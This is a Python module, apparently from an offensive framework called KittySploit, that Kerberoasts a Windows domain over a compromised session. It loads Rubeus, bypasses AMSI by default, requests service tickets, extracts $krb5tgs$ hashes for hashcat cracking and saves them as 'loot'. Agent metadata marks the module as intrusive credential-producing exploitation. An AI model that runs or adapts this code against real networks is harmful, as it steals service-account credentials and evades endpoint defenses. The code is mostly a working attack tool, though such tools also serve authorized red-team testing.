#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Kerberoast via Rubeus loadmodule — request TGS and extract hashcat lines."""

from kittysploit import *

from lib.post.windows.hash_loot import save_hash_loot
from lib.post.windows.loadmodule_helper import run_catalog_assembly
from lib.post.windows.rubeus_hashes import extract_kerberos_hashes
from lib.post.windows.session import WindowsSessionMixin


class Module(Post, WindowsSessionMixin):
    __info__ = {
        "name": "Windows Kerberoast (optional Rubeus)",
        "description": (
            "OPTIONAL fallback: requires Rubeus.exe for live $krb5tgs$ hashes. "
            "Prefer native post/ldap/gather/kerberoast."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL, SessionType.POLLING],
        "references": [
            "https://attack.mitre.org/techniques/T1558/003/",
            "https://github.com/GhostPack/Rubeus",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 3,
            "reversible": False,
            "approval_required": True,
            "produces": ["credentials"],
            "cost": 1.8,
            "noise": 0.75,
            "value": 0.8,
            "requires": {"capabilities_any": ["shell"], "capabilities_all": []},
            "chain": {
                "consumes_capabilities": ["shell", "kerberoast_targets"],
                "produces_capabilities": ["kerberos_hashes"],
            },
        },
    }

    arguments = OptString(
        "kerberoast /stats /outfile:C:\\Windows\\Temp\\ks_tgs.txt",
        "Rubeus arguments (default: kerberoast domain-wide)",
        False,
    )
    bypass_amsi = OptBool(True, "AMSI bypass before loadmodule", False)
    save_loot = OptBool(True, "Write hashcat lines to output/loot/", False)
    assembly = OptString("Rubeus", "Catalog name or path for Rubeus.exe", False)

    def run(self):
        if not self.win_require_windows():
            return False
        if not self.win_require_powershell():
            return False

        args = str(self.arguments or "").strip()
        print_status(f"loadmodule {self.assembly} — {args}")
        try:
            out = run_catalog_assembly(
                self,
                str(self.assembly or "Rubeus"),
                arguments=args,
                bypass_amsi=bool(self.bypass_amsi),
            )
        except FileNotFoundError as exc:
            raise ProcedureError(
                FailureType.NotFound,
                f"{exc}. Drop Rubeus.exe into data/assemblies/ "
                "(see data/assemblies/README.md).",
            ) from exc
        except Exception as exc:
            raise ProcedureError(FailureType.Unknown, f"Rubeus execution failed: {exc}") from exc

        if out:
            print_info(out)

        hashes = extract_kerberos_hashes(out or "")
        tgs = [h for h in hashes if h["kind"] == "krb5tgs"]
        if not tgs:
            print_warning(
                "No $krb5tgs$ lines parsed. If Rubeus wrote an outfile, "
                "download it or adjust arguments (e.g. kerberoast /user:svc)."
            )
            return True

        print_success(f"Extracted {len(tgs)} Kerberoast hash(es) (hashcat -m 13100)")
        for item in tgs:
            user = item.get("username") or "?"
            print_info(f"  [{user}] {item['hash'][:80]}...")

        if self.save_loot:
            path = save_hash_loot(
                tgs,
                kind="kerberoast",
                session_id=str(getattr(self, "session_id", "") or ""),
            )
            if path:
                print_success(f"Loot saved: {path}")
        return True
